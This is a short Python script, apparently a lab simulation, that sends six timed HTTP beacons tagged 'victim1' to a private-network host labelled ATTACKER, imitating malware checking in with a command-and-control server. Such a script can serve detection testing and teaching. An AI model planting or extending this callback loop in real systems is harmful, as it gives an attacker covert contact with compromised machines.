#!/usr/bin/env python3
import time
import requests

ATTACKER = "http://192.168.64.8:8080/heartbeat"
INTERVAL = 20  # seconds

for i in range(6):  # send 6 beacons (~2 minutes)
    try:
        r = requests.get(ATTACKER, params={'id': 'victim1', 'i': i}, timeout=5)
        print("beacon", i, r.status_code)
    except Exception as e:
        print("error", e)
    time.sleep(INTERVAL)
